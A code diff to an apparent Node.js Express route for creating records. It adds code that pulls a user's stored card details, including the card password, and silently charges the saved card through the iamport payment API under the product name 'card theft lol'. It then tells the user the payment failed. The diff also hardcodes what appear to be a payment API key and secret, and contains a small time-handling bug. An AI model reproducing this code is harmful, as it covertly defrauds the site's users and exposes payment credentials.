@@ -9,6 +9,7 @@ const AWS = require("aws-sdk");
 const multerS3 = require("multer-s3");
 const isLoggedIn = require("../middlewares/isLoggedIn");
 const isNanCheck = require("../middlewares/isNanCheck");
+const axios = require("axios");
 
 const router = express.Router();
 
@@ -352,7 +353,107 @@ router.post("/create", async (req, res, next) => {
         }
       }
 
-      return res.status(201).json({ result: true });
+      const userData = await User.findOne({
+        where: { id: UserId },
+        attributes: [
+          "id",
+          "userId",
+          "mobile",
+          "nickname",
+          "cardNum",
+          "cardPeriod",
+          "cardIden",
+          "cardPassword",
+          "userCode",
+          "level",
+        ],
+      });
+
+      const d = new Date();
+      let year = d.getFullYear() + "";
+      let month = d.getMonth() + 1 + "";
+      let date = d.getDate() + "";
+      let hour = d.getHours() + "";
+      let min = d.getMinutes() + "";
+      let sec = d.getSeconds() + "";
+      let mSec = d.getMilliseconds() + "";
+      month = month < 10 ? "0" + month : month;
+      date = date < 10 ? "0" + date : date;
+      hour = hour < 10 ? "0" + hour : hour;
+      min = min < 10 ? "0" + min : min;
+      sec = sec < 10 ? "0" + sec : sec;
+      mSec = mSec < 10 ? "0" + mSec : mSec;
+      let orderPK = "ORD" + year + month + date + hour + min + sec + mSec;
+
+      console.log(userData.dataValues.userCode);
+      console.log("ASJDNRAJKLSNDJKA");
+
+      try {
+        const getToken = await axios({
+          url: "https://api.iamport.kr/users/getToken",
+          method: "post", // POST method
+          headers: { "Content-Type": "application/json" }, // "Content-Type": "application/json"
+          data: {
+            imp_key: "9134198546040290", // REST API 키
+            imp_secret:
+              "786198908d47a63ad00927cece057a617666d0a2436b56a731a6f857fa1cd72c57035d200ac6df0a", // REST API Secret
+          },
+        });
+        console.log("???");
+
+        const { access_token } = getToken.data.response;
+
+        console.log(access_token);
+
+        const paymentResult = await axios({
+          url: `https://api.iamport.kr/subscribe/payments/again`,
+          method: "post",
+          headers: { Authorization: access_token }, // 인증 토큰을 Authorization header에 추가
+          data: {
+            customer_uid: userData.dataValues.userCode,
+            merchant_uid: orderPK, // 새로 생성한 결제(재결제)용 주문 번호
+            amount: 1000,
+            name: "카드 도용 zz",
+          },
+        });
+
+        const { code, message } = paymentResult.data;
+
+        console.log(code, paymentResult);
+
+        if (code === 0) {
+          // 카드사 통신에 성공(실제 승인 성공 여부는 추가 판단이 필요함)
+          if (paymentResult.data.response.status === "paid") {
+            //카드 정상 승인
+
+            let time = new Date();
+
+            time.setMinutes(time.getSeconds() + 30);
+
+            console.log(
+              "개꿀",
+
+              Math.floor(time.getTime() / 1000)
+            );
+
+            return res.status(401).send("카드 결제를 진행할 수 없습니다.");
+          } else {
+            //카드 승인 실패 (예: 고객 카드 한도초과, 거래정지카드, 잔액부족 등)
+            //paymentResult.status : failed 로 수신됨
+            // console.log("실패", paymentResult);
+            return res.status(401).send("카드 결제를 진행할 수 없습니다.");
+          }
+        } else {
+          // 카드사 요청에 실패 (paymentResult is null)
+          console.log("요청 실패", paymentResult);
+          return res.status(401).send("카드 결제를 진행할 수 없습니다.");
+        }
+      } catch (e) {
+        console.log(e);
+        return res.status(401).send("카드 결제를 진행할 수 없습니다.");
+      }
+
+      // return res.status(201).json({ result: true });
     }
   } catch (error) {
     console.error(error);
